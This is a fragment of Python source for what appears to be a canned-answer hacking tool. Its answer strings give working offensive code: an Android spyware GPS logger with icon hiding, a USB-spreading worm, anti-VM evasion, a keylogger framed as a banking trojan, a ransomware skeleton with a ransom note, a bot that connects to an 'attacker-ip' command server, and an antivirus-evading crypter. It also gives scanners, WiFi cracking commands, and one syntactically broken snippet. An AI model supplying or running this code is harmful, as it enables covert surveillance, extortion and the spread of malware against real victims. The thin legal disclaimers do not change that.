                               f"{Colors.GREEN}• C2 Framework Examples (Red Team):{Colors.END}\n"
                               f"   - Cobalt Strike\n"
                               f"   - Mythic\n"
                               f"   - Sliver\n"
                               f"   - Empire\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} Building C2 systems is allowed ONLY for ethical red team simulations, malware analysis environments, and honeypots. Unauthorized use is illegal and tracked internationally.\n",





            "how to create android spyware app": f"{Colors.MAGENTA}Android Spyware App Development:{Colors.END}\n"
                               f"{Colors.GREEN}• Purpose:{Colors.END} Android spyware apps are designed to stealthily monitor user behavior, log data, access sensors, and exfiltrate information without alerting the victim.\n"
                               f"{Colors.GREEN}• Typical Features:{Colors.END}\n"
                               f"{Colors.CYAN}   1. SMS and Call Logging\n"
                               f"{Colors.CYAN}   2. GPS Tracking\n"
                               f"{Colors.CYAN}   3. Microphone Recording\n"
                               f"{Colors.CYAN}   4. Camera Snapshots\n"
                               f"{Colors.CYAN}   5. File Browsing & Uploading\n"
                               f"{Colors.CYAN}   6. Keylogging (via accessibility)\n"
                               f"{Colors.GREEN}• Basic Java Example - Stealth GPS Logger:{Colors.END}\n"
                               f"{Colors.CYAN}public class LocationService extends Service {{\n"
                               f"    LocationManager locationManager;\n"
                               f"    LocationListener listener = new LocationListener() {{\n"
                               f"        public void onLocationChanged(Location location) {{\n"
                               f"            sendToServer(location.getLatitude(), location.getLongitude());\n"
                               f"        }}\n"
                               f"    }};\n"
                               f"    public int onStartCommand(Intent intent, int flags, int startId) {{\n"
                               f"        locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);\n"
                               f"        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 10000, 0, listener);\n"
                               f"        return START_STICKY;\n"
                               f"    }}\n"
                               f"}}\n"
                               f"{Colors.GREEN}• Permissions Required in AndroidManifest.xml:{Colors.END}\n"
                               f"{Colors.CYAN}<uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\" />\n"
                               f"<uses-permission android:name=\"android.permission.INTERNET\" />\n"
                               f"{Colors.GREEN}• Advanced Spyware Additions:{Colors.END}\n"
                               f"   - Hide app icon (use `PackageManager` to disable launcher component)\n"
                               f"   - Use background services or JobScheduler to persist\n"
                               f"   - Use encrypted communication (e.g. HTTPS or Telegram API)\n"
                               f"   - Bypass Play Protect via payload injection or dynamic permissions\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} Creating or distributing spyware is illegal in most countries unless it's for ethical use (parental control, authorized red teaming, malware analysis, etc). Unauthorized use can result in criminal charges.\n",





            "how to create usb spreading worm": f"{Colors.MAGENTA}USB Spreading Worm Development:{Colors.END}\n"
                               f"{Colors.GREEN}• Purpose:{Colors.END} USB worms replicate via removable storage devices, spreading silently to other systems when the infected USB is plugged in.\n"
                               f"{Colors.GREEN}• Core Behavior:{Colors.END}\n"
                               f"{Colors.CYAN}   1. Detect removable drives\n"
                               f"{Colors.CYAN}   2. Copy the worm to the drive\n"
                               f"{Colors.CYAN}   3. Hide the worm using hidden/system attributes\n"
                               f"{Colors.CYAN}   4. Create autorun or disguise the payload as a regular file (e.g., PDF.exe)\n"
                               f"{Colors.CYAN}   5. Optionally set persistence on victim machines\n"
                               f"{Colors.GREEN}• Sample Python Script (Windows Only):{Colors.END}\n"
                               f"{Colors.CYAN}import os\n"
                               f"import shutil\n"
                               f"import string\n"
                               f"from time import sleep\n\n"
                               f"worm_name = 'Update.exe'\n"
                               f"source = os.path.abspath(worm_name)\n"
                               f"while True:\n"
                               f"    for drive in string.ascii_uppercase:\n"
                               f"        path = f'{{drive}}:\\\\'\n"
                               f"        if os.path.exists(path):\n"
                               f"            try:\n"
                               f"                target = os.path.join(path, worm_name)\n"
                               f"                if not os.path.exists(target):\n"
                               f"                    shutil.copyfile(source, target)\n"
                               f"                    os.system(f'attrib +h +s \"{{target}}\"')\n"
                               f"            except:\n"
                               f"                pass\n"
                               f"    sleep(10)\n"
                               f"{Colors.GREEN}• Additional Techniques:{Colors.END}\n"
                               f"   - Use .lnk (shortcut) files to disguise the worm\n"
                               f"   - Drop additional malware (keylogger, backdoor)\n"
                               f"   - Bypass autorun block by tricking users to click disguised files\n"
                               f"   - Encrypt payload to evade detection\n"
                               f"{Colors.GREEN}• Notes for Advanced Variants:{Colors.END} Add logic to target only specific OS types, execute from RAM, or exploit known vulnerabilities on insertion.\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} USB worms are dangerous and illegal to use without authorization. This content is only for educational and ethical hacking research purposes.\n",





            "how to build malware with anti-vm and anti-debugging": f"{Colors.MAGENTA}Malware With Anti-VM & Anti-Debugging Techniques:{Colors.END}\n"
                               f"{Colors.GREEN}• Purpose:{Colors.END} Prevent analysis by detecting if the malware is running in a virtual environment (VM) or being debugged.\n"
                               f"{Colors.GREEN}• Anti-VM Techniques:{Colors.END}\n"
                               f"{Colors.CYAN}   1. Check for virtual drivers (e.g., VMWare, VirtualBox)\n"
                               f"{Colors.CYAN}   2. Detect common VM processes and services\n"
                               f"{Colors.CYAN}   3. Look for MAC address patterns used by VM vendors\n"
                               f"{Colors.CYAN}   4. Analyze system hardware specs (unusually low RAM, CPU, disk size)\n"
                               f"{Colors.GREEN}• Anti-Debugging Techniques:{Colors.END}\n"
                               f"{Colors.CYAN}   1. Use syscalls like IsDebuggerPresent (Windows API)\n"
                               f"{Colors.CYAN}   2. Monitor for timing anomalies using time.sleep()\n"
                               f"{Colors.CYAN}   3. Use exception-based detection (e.g., raising exceptions and checking responses)\n"
                               f"{Colors.CYAN}   4. Detect presence of popular debugging tools (x64dbg, OllyDbg, IDA)\n"
                               f"{Colors.GREEN}• Sample Python Snippet (Basic Check):{Colors.END}\n"
                               f"{Colors.CYAN}import os, sys, time, subprocess\n"
                               f"def is_running_in_vm():\n"
                               f"    try:\n"
                               f"        output = subprocess.check_output('wmic bios get serialnumber', shell=True).decode()\n"
                               f"        vm_indicators = ['VMware', 'VirtualBox', 'QEMU', 'Xen']\n"
                               f"        for indicator in vm_indicators:\n"
                               f"            if indicator.lower() in output.lower():\n"
                               f"                return True\n"
                               f"    except:\n"
                               f"        pass\n"
                               f"    return False\n\n"
                               f"def is_debugger_present():\n"
                               f"    return hasattr(sys, 'gettrace') and sys.gettrace() is not None\n\n"
                               f"if is_running_in_vm() or is_debugger_present():\n"
                               f"    print('Sandbox or debugger detected. Exiting...')\n"
                               f"    sys.exit()\n"
                               f"else:\n"
                               f"    print('Running on real hardware. Proceeding...')\n"
                               f"{Colors.GREEN}• Other Advanced Techniques:{Colors.END}\n"
                               f"   - Timing traps (compare execution time of loops)\n"
                               f"   - Use inline assembly or native C for stealth\n"
                               f"   - Anti-memory dump protection\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} This information is for educational and authorized penetration testing purposes only. Unauthorized use is illegal.\n",





            "how to create banking trojan with form grabbing": f"{Colors.MAGENTA}Banking Trojan With Form Grabbing Technique:{Colors.END}\n"
                               f"{Colors.GREEN}• What is Form Grabbing?{Colors.END} A technique used to steal sensitive information (e.g., usernames, passwords, credit card data) submitted through web forms before it is encrypted and sent.\n"
                               f"{Colors.GREEN}• Use Case:{Colors.END} Commonly used in banking trojans to intercept credentials from online banking platforms.\n"
                               f"{Colors.GREEN}• Core Concepts:{Colors.END}\n"
                               f"{Colors.CYAN}   1. API Hooking:{Colors.END} Intercept browser functions that handle form submissions (e.g., HttpSendRequest).\n"
                               f"{Colors.CYAN}   2. Browser Injection:{Colors.END} Inject JavaScript or DLLs into browsers to log form data.\n"
                               f"{Colors.CYAN}   3. Persistence Mechanism:{Colors.END} Ensures the trojan remains active after reboot.\n"
                               f"{Colors.GREEN}• Targeted Browsers:{Colors.END} Internet Explorer, Chrome, Firefox (via different injection strategies).\n"
                               f"{Colors.GREEN}• Sample Python Simulation (Keylogger + Form Trigger):{Colors.END}\n"
                               f"{Colors.CYAN}from pynput import keyboard\n"
                               f"import time\n"
                               f"keystrokes = []\n"
                               f"def on_press(key):\n"
                               f"    try:\n"
                               f"        keystrokes.append(key.char)\n"
                               f"    except:\n"
                               f"        keystrokes.append(str(key))\n"
                               f"    if len(keystrokes) > 50:\n"
                               f"        with open('grabbed_forms.log', 'a') as f:\n"
                               f"            f.write(''.join(keystrokes) + '\\n')\n"
                               f"        keystrokes.clear()\n"
                               f"listener = keyboard.Listener(on_press=on_press)\n"
                               f"listener.start()\n"
                               f"while True:\n"
                               f"    time.sleep(5)\n"
                               f"{Colors.GREEN}• Real Attacks Usually Use:{Colors.END}\n"
                               f"   - WinAPI hook: SetWindowsHookEx, WH_CALLWNDPROC\n"
                               f"   - JavaScript injection via Man-in-the-Browser (MitB)\n"
                               f"   - Browser add-on abuse\n"
                               f"{Colors.GREEN}• Advanced Additions:{Colors.END}\n"
                               f"   - HTTPS bypass (hooking before encryption)\n"
                               f"   - Real-time panel delivery to C2 server\n"
                               f"   - Form field filtering (grabs only login/password fields)\n"
                               f"{Colors.RED}• LEGAL WARNING:{Colors.END} Creating or deploying a banking trojan is illegal and unethical. This content is for educational and authorized red teaming purposes only.\n",




            "how to create advanced ransomware": f"{Colors.MAGENTA}Advanced Ransomware Development:{Colors.END}\n"
                                   f"{Colors.GREEN}• What is Ransomware?{Colors.END} A type of malware that encrypts a victim's data and demands a ransom to decrypt it.\n"
                                   f"{Colors.GREEN}• Core Functionalities of Advanced Ransomware:{Colors.END}\n"
                                   f"{Colors.CYAN}   1. File Discovery: Locate important user files\n"
                                   f"{Colors.CYAN}   2. Encryption: Use strong cryptography (e.g., AES+RSA hybrid)\n"
                                   f"{Colors.CYAN}   3. Communication: Contact Command & Control (C2) server for key handling\n"
                                   f"{Colors.CYAN}   4. Ransom Note: Drop instructions for payment\n"
                                   f"{Colors.CYAN}   5. Anti-Analysis: Obfuscate code, disable recovery, avoid VMs/sandboxes\n"
                                   f"{Colors.GREEN}• Encryption Strategy:{Colors.END}\n"
                                   f"{Colors.CYAN}   - Generate AES key per victim\n"
                                   f"{Colors.CYAN}   - Encrypt AES key with attacker's RSA public key\n"
                                   f"{Colors.CYAN}   - Encrypt victim's files with AES\n"
                                   f"{Colors.GREEN}• Sample Ransomware Skeleton (Python - Simulated):{Colors.END}\n"
                                   f"{Colors.CYAN}from Crypto.Cipher import AES\n"
                                   f"import os\n"
                                   f"key = os.urandom(32)\n"
                                   f"cipher = AES.new(key, AES.MODE_EAX)\n"
                                   f"def encrypt_file(filepath):\n"
                                   f"    with open(filepath, 'rb') as f:\n"
                                   f"        data = f.read()\n"
                                   f"    ciphertext, tag = cipher.encrypt_and_digest(data)\n"
                                   f"    with open(filepath + '.enc', 'wb') as f:\n"
                                   f"        f.write(ciphertext)\n"
                                   f"    os.remove(filepath)\n"
                                   f"\n"
                                   f"encrypt_file('/home/user/Documents/secret.pdf')\n"
                                   f"{Colors.GREEN}• Drop Ransom Note (Simulated):{Colors.END}\n"
                                   f"{Colors.CYAN}with open('README_RESTORE_FILES.txt', 'w') as note:\n"
                                   f"    note.write('Your files are encrypted! Pay 0.05 BTC to address XXXXX to restore.')\n"
                                   f"{Colors.RED}• Advanced Features:{Colors.END}\n"
                                   f"{Colors.CYAN}   - Encrypt only file types like .docx, .xlsx, .pdf, .jpg\n"
                                   f"{Colors.CYAN}   - Bypass UAC or elevate privileges\n"
                                   f"{Colors.CYAN}   - Self-delete after execution or propagate via SMB/USB\n"
                                   f"{Colors.GREEN}• Optional Add-ons:{Colors.END} C2 callback, TOR communication, time-based file wipe\n"
                                   f"{Colors.RED}• Ethical Reminder:{Colors.END} Real ransomware (e.g. Lockbit, REvil, WannaCry) caused massive harm. Use for RESEARCH PURPOSES ONLY.\n",



            "how to create advanced worm": f"{Colors.MAGENTA}Advanced Worm Development:{Colors.END}\n"
                             f"{Colors.GREEN}• What is a Worm?{Colors.END} A self-replicating program that spreads automatically across networks or devices without needing a host file.\n"
                             f"{Colors.GREEN}• Objective:{Colors.END} Infect as many systems as possible with little or no user interaction.\n"
                             f"{Colors.GREEN}• Core Capabilities of an Advanced Worm:{Colors.END}\n"
                             f"{Colors.CYAN}   1. Autonomous Propagation: Spreads via LAN, internet, USB, email, etc.\n"
                             f"{Colors.CYAN}   2. Exploit Mechanism: Uses known vulnerabilities (e.g., EternalBlue, RDP, SMB).\n"
                             f"{Colors.CYAN}   3. Payload Delivery: Can drop ransomware, backdoors, or bots.\n"
                             f"{Colors.CYAN}   4. Persistence: Ensures it remains active after reboot.\n"
                             f"{Colors.CYAN}   5. Evasion: Avoids antivirus using obfuscation or crypters.\n"
                             f"{Colors.GREEN}• Propagation Techniques:{Colors.END}\n"
                             f"{Colors.CYAN}   - Scan IP ranges and port sweep for vulnerable hosts\n"
                             f"{Colors.CYAN}   - Exploit open services (SMB, RDP, HTTP)\n"
                             f"{Colors.CYAN}   - Send phishing emails with malicious links\n"
                             f"{Colors.CYAN}   - Infect removable media (USB autorun payloads)\n"
                             f"{Colors.GREEN}• Example Attack Flow:{Colors.END}\n"
                             f"{Colors.CYAN}   - Discover -> Exploit -> Infect -> Copy -> Repeat\n"
                             f"{Colors.GREEN}• Sample Skeleton in Python (Simulated Concept Only):{Colors.END}\n"
                             f"{Colors.CYAN}import socket, os\n"
                             f"def scan(ip_range):\n"
                             f"    for ip in ip_range:\n"
                             f"        if port_open(ip, 445):  # SMB Port\n"
                             f"            try_infect(ip)\n"
                             f"\n"
                             f"def try_infect(target):\n"
                             f"    if exploit_smb(target):\n"
                             f"        upload_payload(target)\n"
                             f"        execute_payload(target)\n"
                             f"\n"
                             f"def main():\n"
                             f"    my_ip = get_local_ip()\n"
                             f"    targets = generate_ip_range(my_ip)\n"
                             f"    scan(targets)\n"
                             f"main()\n"
                             f"{Colors.RED}• Advanced Features (Optional):{Colors.END}\n"
                             f"{Colors.CYAN}   - Encrypt communications (C2 via HTTPS)\n"
                             f"{Colors.CYAN}   - Use polymorphic encryption for payload\n"
                             f"{Colors.CYAN}   - Create botnet for central control\n"
                             f"{Colors.GREEN}• Languages Often Used:{Colors.END} Python, C/C++, Go, Powershell (for Windows worms)\n"
                             f"{Colors.RED}• Ethical Use Only:{Colors.END} Real-world worms like WannaCry caused global damage; use for lab simulations or red teaming ONLY.\n",
          

            "how to create botnet like mirai": f"{Colors.MAGENTA}Botnet Creation (Inspired by Mirai):{Colors.END}\n"
                                   f"{Colors.GREEN}• What is a Botnet?{Colors.END} A botnet is a network of compromised devices (bots) under the control of a command-and-control (C2) server.\n"
                                   f"{Colors.GREEN}• What did Mirai do?{Colors.END} Mirai scanned the internet for vulnerable IoT devices (using default credentials), then enslaved them into a botnet that launched massive DDoS attacks.\n"
                                   f"{Colors.GREEN}• Key Components:{Colors.END}\n"
                                   f"{Colors.CYAN}   1. Scanner:{Colors.END} Looks for IoT devices with open Telnet (port 23/2323).\n"
                                   f"{Colors.CYAN}   2. Loader:{Colors.END} Brute-forces credentials to gain shell access.\n"
                                   f"{Colors.CYAN}   3. Bot (Malware):{Colors.END} Gets executed on the device, connects to C2.\n"
                                   f"{Colors.CYAN}   4. C2 Server:{Colors.END} Sends commands like DDoS, self-replicate, or update.\n"
                                   f"{Colors.GREEN}• Sample Bot (Minimal Python Example):{Colors.END}\n"
                                   f"{Colors.CYAN}import socket, os\n"
                                   f"s = socket.socket()\n"
                                   f"s.connect(('attacker-ip', 1337))  # connect to C2\n"
                                   f"while True:\n"
                                   f"    cmd = s.recv(1024).decode()\n"
                                   f"    if cmd == 'ddos':\n"
                                   f"        os.system('ping -c 100 target.com')\n"
                                   f"    elif cmd == 'kill':\n"
                                   f"        break\n"
                                   f"s.close(){Colors.END}\n"
                                   f"{Colors.GREEN}• Mirai Unique Traits:{Colors.END}\n"
                                   f"{Colors.CYAN}   - Written in C with cross-compilation for different CPUs (ARM, MIPS, etc)\n"
                                   f"{Colors.CYAN}   - Used a central MySQL database to log infected IPs\n"
                                   f"{Colors.CYAN}   - Cleared memory and killed other malware on infected devices\n"
                                   f"{Colors.GREEN}• C2 Communication Methods:{Colors.END} Raw TCP, IRC-style text commands, or HTTP polling.\n"
                                   f"{Colors.RED}• WARNING:{Colors.END} Building or launching real botnets is illegal and unethical. This info is only for malware research, defense simulation, and lab practice.",



            "how to build a malware crypter": f"{Colors.MAGENTA}Malware Crypter Development:{Colors.END}\n"
                                  f"{Colors.GREEN}• What is a Crypter?{Colors.END} A crypter is a tool designed to encrypt, obfuscate, or otherwise hide malware code to evade antivirus detection.\n"
                                  f"{Colors.GREEN}• Purpose:{Colors.END} To make the malware appear benign or undetectable to signature-based scanners and heuristic analysis.\n"
                                  f"{Colors.GREEN}• Core Concepts:{Colors.END}\n"
                                  f"{Colors.CYAN}   1. Encryption/Obfuscation:{Colors.END} Transform the malware payload so its raw signature is hidden.\n"
                                  f"{Colors.CYAN}   2. Decryption Stub:{Colors.END} A small piece of code that decrypts and executes the hidden payload at runtime.\n"
                                  f"{Colors.CYAN}   3. Polymorphism:{Colors.END} Crypters may mutate the payload or the stub every time it’s generated to avoid pattern detection.\n"
                                  f"{Colors.CYAN}   4. Packers vs Crypters:{Colors.END} Packers compress or bundle malware, Crypters focus on hiding and encryption.\n"
                                  f"{Colors.GREEN}• Basic Crypter Workflow:{Colors.END}\n"
                                  f"{Colors.GREEN}   1. Take malware executable as input.{Colors.END}\n"
                                  f"{Colors.GREEN}   2. Encrypt the payload with symmetric encryption (e.g., AES).{Colors.END}\n"
                                  f"{Colors.GREEN}   3. Generate a small stub program that contains the encrypted payload and decrypt logic.{Colors.END}\n"
                                  f"{Colors.GREEN}   4. Compile and output the final crypter executable.\n"
                                  f"{Colors.RED}• Important:{Colors.END} Crypters don't remove malware functionality; they only hide it.\n"
                                  f"{Colors.GREEN}• Sample Python Pseudocode for encryption part:{Colors.END}\n"
                                  f"{Colors.CYAN}import base64, os\n"
                                  f"from Crypto.Cipher import AES\n"
                                  f"def pad(s):\n"
                                  f"    return s + (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)\n"
                                  f"key = os.urandom(16)  # Random AES key\n"
                                  f"with open('malware.exe', 'rb') as f:\n"
                                  f"    data = f.read()\n"
                                  f"cipher = AES.new(key, AES.MODE_CBC)\n"
                                  f"ct_bytes = cipher.encrypt(pad(data))\n"
                                  f"encrypted_payload = base64.b64encode(cipher.iv + ct_bytes)\n"
                                  f"print('Encrypted payload:', encrypted_payload)\n"
                                  f"{Colors.GREEN}• The stub (in C or Python) would decrypt this base64 blob at runtime and execute in memory.{Colors.END}\n"
                                  f"{Colors.GREEN}• Anti-Detection Techniques:{Colors.END}\n"
                                  f"   - Use polymorphic stubs (code changes every build)\n"
                                  f"   - Insert junk code or garbage instructions\n"
                                  f"   - Encrypt strings and API calls\n"
                                  f"   - Use API calls to allocate executable memory and run decrypted code\n"
                                  f"{Colors.RED}• LEGAL WARNING:{Colors.END} Crypters can be used maliciously. Only use this knowledge for defensive research or authorized testing.\n",

}

  # NEW: Network Scanning Tools
        self.scanning_tools = {
            "how to create network scan tool": f"{Colors.BLUE} Network Scanner Development Guide:{Colors.END}\n"
                                       f"{Colors.GREEN}• Use Python's socket module to establish connections and check open ports.{Colors.END}\n"
                                       f"{Colors.GREEN}• Implement both TCP (reliable, connection-based) and UDP (faster, connectionless) scanning options.{Colors.END}\n"
                                       f"{Colors.GREEN}• Add banner grabbing to detect service types on open ports (e.g., HTTP, SSH, FTP).{Colors.END}\n"
                                       f"{Colors.GREEN}• Incorporate threading or multiprocessing to scan multiple ports/hosts simultaneously and improve performance.{Colors.END}\n"
                                       f"{Colors.GREEN}• Include logging and report generation for saving scan results (JSON, TXT, etc).{Colors.END}\n"
                                       f"{Colors.RED}• Optionally integrate with libraries like {Colors.YELLOW}nmap-python{Colors.RED} for advanced scans (OS detection, version, etc).{Colors.END}\n\n"
                                       f"{Colors.YELLOW}🔧 Example: Basic TCP Port Scanner in Python:{Colors.END}\n\n"
                                       f"{Colors.RED}# This script scans a target for open TCP ports{Colors.END}\n"
                                       f"{Colors.CYAN}import socket\n"
                                       f"from concurrent.futures import ThreadPoolExecutor\n\n"
                                       f"target = '192.168.1.1'\n"
                                       f"ports_to_scan = range(20, 1024)\n\n"
                                       f"def scan_port(port):\n"
                                       f"    try:\n"
                                       f"        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                                       f"        s.settimeout(1)\n"
                                       f"        result = s.connect_ex((target, port))\n"
                                       f"        if result == 0:\n"
                                       f"            print(f'[+] Port  {{port}}  is open')\n"
                                       f"        s.close()\n"
                                       f"    except:\n"
                                       f"        pass\n\n"
                                       f"with ThreadPoolExecutor(max_workers=100) as executor:\n"
                                       f"    for port in ports_to_scan:\n"
                                       f"        executor.submit(scan_port, port)\n"
                                       f"{Colors.END}",

            


        
            "how to create web scan tool": f"{Colors.BLUE}🌐 Web Scanner Development Guide:{Colors.END}\n"
                                   f"{Colors.GREEN}• Use the 'requests' library to send HTTP/HTTPS requests and analyze response codes, headers, and body.{Colors.END}\n"
                                   f"{Colors.GREEN}• Implement directory and file enumeration using common wordlists (e.g., common.txt, dirbuster lists).{Colors.END}\n"
                                   f"{Colors.GREEN}• Check for known vulnerabilities (like XSS, LFI, SQLi) by injecting payloads and analyzing responses.{Colors.END}\n"
                                   f"{Colors.GREEN}• Use 'BeautifulSoup' or 'lxml' to parse and analyze HTML structure, extract forms, scripts, and links.{Colors.END}\n"
                                   f"{Colors.GREEN}• Add SSL/TLS certificate inspection using 'ssl' or 'OpenSSL' for checking cert validity, expiry, etc.{Colors.END}\n"
                                   f"{Colors.GREEN}• Log all findings (status codes, discovered paths, vulnerability traces) into a structured format (CSV, JSON, DB).{Colors.END}\n"
                                   f"{Colors.RED}• Optionally integrate proxy support, user-agent spoofing, and recursion for depth-based scans.{Colors.END}\n\n"
                                   f"{Colors.YELLOW}🔧 Example: Basic Web Directory Scanner in Python:{Colors.END}\n\n"
                                   f"{Colors.RED}# This tool scans a website for common directories/files{Colors.END}\n"
                                   f"{Colors.CYAN}import requests\n"
                                   f"import sys\n\n"
                                   f"target = 'http://example.com'\n"
                                   f"wordlist = ['admin', 'login', 'uploads', 'dashboard', 'robots.txt']\n\n"
                                   f"for path in wordlist:\n"
                                   f"    url = f'{{target}}/{{path}}'\n"
                                   f"    try:\n"
                                   f"        r = requests.get(url)\n"
                                   f"        if r.status_code == 200:\n"
                                   f"            print(f'[+] Found: {{url}}')\n"
                                   f"        elif r.status_code == 403:\n"
                                   f"            print(f'[-] Forbidden: {{url}}')\n"
                                   f"    except requests.RequestException:\n"
                                   f"        pass\n"
                                   f"{Colors.END}",

                                         
                                                                            
                                                                    
            
            "how to create vulnerability scanner": f"{Colors.BLUE}🛡️ Vulnerability Scanner Creation Guide:{Colors.END}\n"
                                          f"{Colors.GREEN}• Build or integrate a vulnerability database (e.g., NVD, Exploit-DB, custom YAML/JSON files).{Colors.END}\n"
                                          f"{Colors.GREEN}• Perform service and version detection using tools like Nmap or banner grabbing via sockets.{Colors.END}\n"
                                          f"{Colors.GREEN}• Match detected versions with known CVEs (Common Vulnerabilities and Exposures) using local DB or CVE APIs.{Colors.END}\n"
                                          f"{Colors.GREEN}• Create modular scan engines: web scanner, OS scanner, open port scanner, CMS fingerprinting etc.{Colors.END}\n"
                                          f"{Colors.GREEN}• Add reporting features: output scan results to HTML, JSON, or PDF format for analysis/reporting.{Colors.END}\n"
                                          f"{Colors.RED}• Bonus: Add scoring system (CVSS) to rate vulnerability risk levels automatically.{Colors.END}\n\n"
                                          f"{Colors.YELLOW}🔧 Example: Simple Version Fingerprint & CVE Matcher (using NVD API):{Colors.END}\n\n"
                                          f"{Colors.RED}# NOTE: This is a simplified concept, real-world scanners are more advanced.{Colors.END}\n"
                                          f"{Colors.CYAN}import requests\n"
                                          f"import json\n\n"
                                          f"def get_cves(product, version):\n"
                                          f"    base_url = 'https://services.nvd.nist.gov/rest/json/cves/1.0'\n"
                                          f"    params = {{\n"
                                          f"        'keyword': f'{{product}} {{version}}',\n"
                                          f"        'resultsPerPage': 5\n"
                                          f"    }}\n"
                                          f"    response = requests.get(base_url, params=params)\n"
                                          f"    if response.status_code == 200:\n"
                                          f"        data = response.json()\n"
                                          f"        for item in data.get('result', {{}}).get('CVE_Items', []):\n"
                                          f"    else:\n"
                                          f"        print('[!] Failed to fetch CVEs')\n\n"
                                          f"# Example usage:\n"
                                          f"get_cves('Apache', '2.4.49'){Colors.END}",

                                                 
                                                 
                                                
            


        
            "how to create port scanner": f"{Colors.BLUE}🛰️ Port Scanner Development Guide:{Colors.END}\n"
                                 f"{Colors.GREEN}• Implement TCP Connect Scan using Python's socket library (connect_ex method).{Colors.END}\n"
                                 f"{Colors.GREEN}• Add SYN scan (requires raw sockets and root privileges) for stealthy scanning.{Colors.END}\n"
                                 f"{Colors.GREEN}• Include UDP scanning (harder to detect open/closed states, needs timeout control).{Colors.END}\n"
                                 f"{Colors.RED}• Use multi-threading or async to speed up scanning of multiple hosts or ports.{Colors.END}\n"
                                 f"{Colors.GREEN}• Add service banner grabbing to identify applications running on open ports.{Colors.END}\n"
                                 f"{Colors.YELLOW}🔧 Example: Simple TCP Port Scanner in Python:{Colors.END}\n\n"
                                 f"{Colors.CYAN}import socket\n"
                                 f"import threading\n\n"
                                 f"def scan_port(ip, port):\n"
                                 f"    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
                                 f"    s.settimeout(1)\n"
                                 f"    result = s.connect_ex((ip, port))\n"
                                 f"    if result == 0:\n"
                                 f"        print(f'[+] Port  {{port}}  is open on {{ip}}')\n"
                                 f"    s.close()\n\n"
                                 f"target_ip = '192.168.1.1'\n"
                                 f"for port in range(1, 1025):\n"
                                 f"    thread = threading.Thread(target=scan_port, args=(target_ip, port))\n"
                                 f"    thread.start(){Colors.END}",



 

        
            "how to create subdomain scanner": f"{Colors.BLUE}🌐 Subdomain Scanner Creation:{Colors.END}\n"
                                     f"{Colors.GREEN}• Use DNS resolution techniques to validate subdomains.{Colors.END}\n"
                                     f"{Colors.GREEN}• Implement wordlist-based brute-force to discover subdomains (e.g., admin.domain.com).{Colors.END}\n"
                                     f"{Colors.GREEN}• Add Certificate Transparency (CT) log scraping to find hidden subdomains (via crt.sh or Censys).{Colors.END}\n"
                                     f"{Colors.RED}• Include wildcard domain detection to avoid false positives.{Colors.END}\n"
                                     f"{Colors.GREEN}• Optional: Integrate HTTP probing to check live subdomains.{Colors.END}\n"
                                     f"{Colors.YELLOW}🔧 Example: Basic Subdomain Scanner using dnspython:{Colors.END}\n\n"
                                     f"{Colors.CYAN}import dns.resolver\n\n"
                                     f"domain = 'example.com'\n"
                                     f"wordlist = ['www', 'mail', 'ftp', 'dev', 'admin']\n\n"
                                     f"for sub in wordlist:\n"
                                     f"    try:\n"
                                     f"        full_domain = f\"{{sub}}.{{domain}}\"\n"
                                     f"        answers = dns.resolver.resolve(full_domain, 'A')\n"
                                     f"        for rdata in answers:\n"
                                     f"            print(f'[+] Found: {{full_domain}} -> {{rdata.address}}')\n"
                                     f"    except:\n"
                                     f"        pass{Colors.END}",





        
            "how to create wifi scanner": f"{Colors.BLUE}📡 WiFi Scanner Development:{Colors.END}\n"
                                f"{Colors.GREEN}• Use a wireless interface in monitor mode (e.g., wlan0mon).{Colors.END}\n"
                                f"{Colors.GREEN}• Implement packet sniffing using Scapy to capture 802.11 beacon frames.{Colors.END}\n"
                                f"{Colors.GREEN}• Extract access point (AP) info such as SSID, MAC (BSSID), channel, and signal strength (RSSI).{Colors.END}\n"
                                f"{Colors.RED}• Detect encryption types (WEP, WPA, WPA2, WPA3) from information elements.{Colors.END}\n"
                                f"{Colors.GREEN}• Optionally log discovered networks to a file for post-analysis.{Colors.END}\n"
                                f"{Colors.YELLOW}🔧 Example: Basic WiFi Scanner using Scapy:{Colors.END}\n\n"
                                f"{Colors.CYAN}from scapy.all import *\n"
                                f"from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt\n\n"
                                f"def packet_handler(pkt):\n"
                                f"    if pkt.haslayer(Dot11Beacon):\n"
                                f"        ssid = pkt[Dot11Elt].info.decode()\n"
                                f"        bssid = pkt[Dot11].addr2\n"
                                f"        try:\n"
                                f"            enc = pkt.sprintf(\"%Dot11Beacon.cap%\")\n"
                                f"        except:\n"
                                f"            enc = 'Unknown'\n"
                                f"        print(f'[+] SSID: {{ssid}} | BSSID: {{bssid}} | Encryption: {{enc}}')\n\n"
                                f"print('[*] Scanning... Press Ctrl+C to stop.')\n"
                                f"sniff(iface='wlan0mon', prn=packet_handler, store=0){Colors.END}"
}
 


       # NEW: Hacking techniques 
        self.hacking_techniques = {
            "how to hack wifi network": f"{Colors.CYAN}Wi-Fi Network Hacking Techniques (Offensive Focus):{Colors.END}\n"
                                      f"{Colors.GREEN}• WPA/WPA2 Handshake Capture & Cracking:{Colors.END} Capture the 4-way handshake and brute-force the password offline.\n"
                                      f"{Colors.YELLOW}  Tool Example:{Colors.END} airodump-ng, aireplay-ng, aircrack-ng\n"
                                      f"{Colors.YELLOW}  Command Sample:{Colors.END} airodump-ng wlan0mon --bssid [target BSSID] -c [channel] -w capture\n"
                                      f"{Colors.YELLOW}  Crack with:{Colors.END} aircrack-ng capture.cap -w wordlist.txt\n\n"
                                      f"{Colors.GREEN}• Evil Twin Attack:{Colors.END} Clone a real Wi-Fi network to trick users into connecting.\n"
                                      f"{Colors.YELLOW}  Tool Example:{Colors.END} Wifiphisher, Fluxion\n"
                                      f"{Colors.YELLOW}  Method:{Colors.END} Intercept credentials via fake login portal.\n\n"
                                      f"{Colors.GREEN}• WPS PIN Bruteforce:{Colors.END} Exploit routers with WPS enabled by bruteforcing the 8-digit PIN.\n"
                                      f"{Colors.YELLOW}  Tool Example:{Colors.END} Reaver, Bully\n"
